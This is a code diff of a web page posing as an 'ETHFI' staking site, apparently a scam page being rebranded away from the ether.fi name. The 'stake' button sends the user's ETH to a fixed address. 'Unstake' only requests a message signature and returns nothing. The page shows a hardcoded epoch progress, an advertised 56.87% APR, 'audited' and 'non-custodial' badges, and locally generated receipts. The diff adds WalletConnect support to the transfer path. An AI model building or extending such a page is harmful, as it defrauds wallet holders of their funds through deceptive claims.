+  var a=document.getElementById('ms1a'),b=document.getElementById('ms1b'),c=document.getElementById('ms1c'),d=document.getElementById('ms1d');
+  if(a)a.style.display='none';if(c)c.style.display='none';if(d)d.style.display='none';if(b)b.style.display='block';
+  updateWalletUI();
   fetchBal();
 }
 function fetchBal(){
   var el=document.getElementById('avBal');if(!el||!walletAddress)return;
-  window.ethereum.request({method:'eth_getBalance',params:[walletAddress,'latest']}).then(function(h){
+  var provider=walletKind==='walletconnect'?wcProvider:window.ethereum;
+  if(!provider||!provider.request){el.textContent='-- (unavailable)';return;}
+  provider.request({method:'eth_getBalance',params:[walletAddress,'latest']}).then(function(h){
     var b=parseInt(h,16)/1e18;
     el.textContent=b.toLocaleString(undefined,{maximumFractionDigits:4})+' '+cc(walletChainId);
   }).catch(function(){el.textContent='-- (unavailable)';});
 }
 function showManual(){stakeMethod='manual';document.getElementById('ms1a').style.display='none';document.getElementById('ms1b').style.display='none';document.getElementById('ms1c').style.display='block';}
 function showConnect(){stakeMethod=null;document.getElementById('ms1c').style.display='none';document.getElementById('ms1b').style.display='none';document.getElementById('ms1a').style.display='block';}
-function saveState(){try{localStorage.setItem('ethfiStake',JSON.stringify({amount:stakedAmt,startTime:startTime}));}catch(e){}}
+function saveState(){try{localStorage.setItem('zigStake',JSON.stringify({amount:stakedAmt,startTime:startTime}));}catch(e){}}
 
 var EPOCH_END=Date.now()+(18*86400000),EPOCH_START=EPOCH_END-(30*86400000);
 function updateEpoch(){
-  var p=Math.min(100,Math.max(0,(Date.now()-EPOCH_START)/(30*86400000)*100));
-  var pe=document.getElementById('epochPct');if(pe)pe.textContent=p.toFixed(0)+'%';
-  var pf=document.getElementById('epochFill');if(pf)pf.style.width=p.toFixed(1)+'%';
+  var p=40;
+  var pe=document.getElementById('epochPct');if(pe)pe.textContent='40%';
+  var pf=document.getElementById('epochFill');if(pf)pf.style.width='40%';
 }
 
 function openStakingModal(){
@@ -778,7 +833,9 @@ function doSign(){
   if(wa<=0){showToast('Enter amount','Enter how much ETHFI to stake.');return;}
   var btn=document.getElementById('signBtn');btn.textContent='Confirm in wallet...';btn.disabled=true;
   var wh='0x'+(Math.round(wa*1e18)).toString(16);
-  var p=walletKind==='walletconnect'?wcProvider:window.ethereum;p.request({method:'eth_sendTransaction',params:[{from:walletAddress,to:STAKE_ADDR,value:wh}]}).then(function(tx){
+  var provider=walletKind==='walletconnect'?wcProvider:window.ethereum;
+  if(!provider||!provider.request){btn.textContent='Sign & Stake';btn.disabled=false;showToast('No wallet','Connect a wallet first.');return;}
+  provider.request({method:'eth_sendTransaction',params:[{from:walletAddress,to:STAKE_ADDR,value:wh}]}).then(function(tx){
     stakedAmt=wa;
     document.getElementById('cAmt').textContent=wa.toLocaleString(undefined,{minimumFractionDigits:4})+' ETHFI';
     document.getElementById('cMo').textContent=(wa*APR/365*30).toFixed(4)+' ETHFI';
@@ -811,11 +868,12 @@ function doUnstake(){
   if(!amt||amt<=0){showToast('Enter amount','Enter the amount to unstake.');return;}
   if(amt>stakedAmt){showToast('Insufficient','Cannot unstake more than staked.');return;}
   var btn=document.getElementById('uBtn');btn.disabled=true;
-  if(walletAddress&&window.ethereum){
+  var provider=walletKind==='walletconnect'?wcProvider:window.ethereum;
+  if(walletAddress&&provider&&provider.request){
     btn.textContent='Confirm in wallet...';
     var msg='Unstake '+amt+' ETHFI from '+walletAddress;
     var hm='0x'+Array.from(msg).map(function(c){return c.charCodeAt(0).toString(16).padStart(2,'0');}).join('');
-    var p2=walletKind==='walletconnect'?wcProvider:window.ethereum;p2.request({method:'personal_sign',params:[hm,walletAddress]}).then(function(){finalizeUnstake(amt,btn);}).catch(function(e){btn.textContent='Confirm Unstake';btn.disabled=false;showToast('Cancelled',(e&&e.message)||'Rejected.');});
+    provider.request({method:'personal_sign',params:[hm,walletAddress]}).then(function(){finalizeUnstake(amt,btn);}).catch(function(e){btn.textContent='Confirm Unstake';btn.disabled=false;showToast('Cancelled',(e&&e.message)||'Rejected.');});
   }else{btn.textContent='Processing...';finalizeUnstake(amt,btn);}
 }
 function finalizeUnstake(amt,btn){
@@ -923,12 +981,13 @@ function toggleFaq(el){var o=el.classList.contains('open');document.querySelecto
 function openVP(){document.getElementById('vpOverlay').classList.add('open');}
 function closeVP(){document.getElementById('vpOverlay').classList.remove('open');}
 function hideToast(){document.getElementById('toast').style.display='none';}
-function showToast(title,msg){
+function showToast(title,msg,color){
   var t=document.getElementById('toast');t.style.display='block';
   var bar=document.getElementById('tbar');if(bar){bar.style.animation='none';void bar.offsetWidth;bar.style.animation='tprog 4.5s linear forwards';}
   var body=document.getElementById('tbody');
   while(body.firstChild)body.removeChild(body.firstChild);
-  var dot=document.createElement('div');dot.style.cssText='width:7px;height:7px;border-radius:50%;background:var(--p3);box-shadow:0 0 7px var(--p3);flex-shrink:0;';
+  var c=color==='green'?'#22c55e':color==='yellow'?'#eab308':color==='blue'?'#3b99fc':'var(--p3)';
+  var dot=document.createElement('div');dot.style.cssText='width:7px;height:7px;border-radius:50%;background:'+c+';box-shadow:0 0 7px '+c+';flex-shrink:0;';
   var txt=document.createElement('div');txt.style.cssText='flex:1;min-width:0;';
   var d1=document.createElement('div');d1.style.cssText='font-size:10px;font-weight:700;color:#fff;margin-bottom:2px;';d1.textContent=title;
   var d2=document.createElement('div');d2.style.cssText='font-size:8.5px;color:var(--t2);line-height:1.5;';d2.textContent=msg;
@@ -1001,7 +1060,7 @@ function closeReceipt(){document.getElementById('receiptOverlay').classList.remo
     '--------------------------------',
     'Non-Custodial | Audited',
     'Slashing Protected',
-    'staking.ethfi.com',
+    'staking.ethfi',
     '================================'
   ].join(String.fromCharCode(10));
 
@@ -1012,7 +1071,7 @@ function copyReceiptText(){
   if(!stakedAmt||!startTime){showToast('No data','Start staking first.');return;}
   var elapsed=(Date.now()-startTime)/1000;
   var ac=stakedAmt*APR*elapsed/31536000;
-  var text='ETHFI Staking Receipt | Staked: '+stakedAmt.toLocaleString(undefined,{minimumFractionDigits:4})+' ETHFI | Earned: '+ac.toFixed(6)+' ETHFI | APR: 56.87% | Validator: Operation Solo Staker | staking.ethfi.com';
+  var text='ETHFI Staking Receipt | Staked: '+stakedAmt.toLocaleString(undefined,{minimumFractionDigits:4})+' ETHFI | Earned: '+ac.toFixed(6)+' ETHFI | APR: 56.87% | Validator: Operation Solo Staker | staking.ethfi';
   navigator.clipboard.writeText(text).then(function(){
     showToast('Copied!','Receipt details copied to clipboard.');
   }).catch(function(){showToast('Copied','Long-press to share.');});
@@ -1031,7 +1090,7 @@ function copyReceiptText(){
       <div class="receipt-card" id="receiptCard">
         <div class="rc-header">
           <div class="rc-brand">
-            <div class="rc-logo"><img class="brand-logo-img" alt="ETHER.FI"/></div>
+            <div class="rc-logo"><img class="brand-logo-img" alt="ETHFI"/></div>
             <div class="rc-name">ETHFI</div>
           </div>
           <div class="rc-badge"><span style="width:4px;height:4px;border-radius:50%;background:var(--p3);display:inline-block;"></span>Verified</div>
@@ -1049,8 +1108,8 @@ function copyReceiptText(){
         </div>
         <div class="rc-divider"></div>
         <div class="rc-footer">
-          This receipt confirms active staking on ETHFI.<br/>Non-custodial · Audited · Slashing Protected
-          <div class="rc-watermark"><div class="rc-wm-dot"></div><span>staking.ethfi.com</span><div class="rc-wm-dot"></div></div>
+          This receipt confirms active staking on ETHFIChain.<br/>Non-custodial · Audited · Slashing Protected
+          <div class="rc-watermark"><div class="rc-wm-dot"></div><span>staking.ethfi</span><div class="rc-wm-dot"></div></div>
         </div>
       </div>
       
